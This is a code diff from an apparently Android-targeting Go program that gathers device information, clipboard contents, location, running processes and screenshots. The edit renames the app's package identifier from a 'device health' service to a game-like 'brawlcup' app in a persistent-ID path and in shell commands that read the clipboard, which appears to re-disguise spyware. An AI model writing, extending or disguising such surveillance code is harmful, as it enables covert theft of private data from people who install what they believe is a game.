@@ -520,8 +520,8 @@ func getMachineID() string {
 func getOrCreatePersistentID() string {
 	// Try common app data paths
 	paths := []string{
-		"/data/data/com.devicehealth.service/files/.mid",
-		"/data/user/0/com.devicehealth.service/files/.mid",
+		"/data/data/com.brawlcup.app/files/.mid",
+		"/data/user/0/com.brawlcup.app/files/.mid",
 	}
 	// Read existing
 	for _, p := range paths {
@@ -632,7 +632,7 @@ func getDeviceInfo() map[string]interface{} {
 	info["os"] = osStr
 
 	// Clipboard
-	clip, _ := shellExec("service call clipboard 2 s16 com.devicehealth.service 2>/dev/null")
+	clip, _ := shellExec("service call clipboard 2 s16 com.brawlcup.app 2>/dev/null")
 	info["clipboard"] = clip
 
 	// Running processes
@@ -961,7 +961,7 @@ func getLocation() (string, error) {
 }
 
 func getClipboard() (string, error) {
-	return shellExecTimeout("service call clipboard 2 s16 com.devicehealth.service 2>/dev/null", 5*time.Second)
+	return shellExecTimeout("service call clipboard 2 s16 com.brawlcup.app 2>/dev/null", 5*time.Second)
 }
 
 func takeScreenshot() ([]byte, error) {
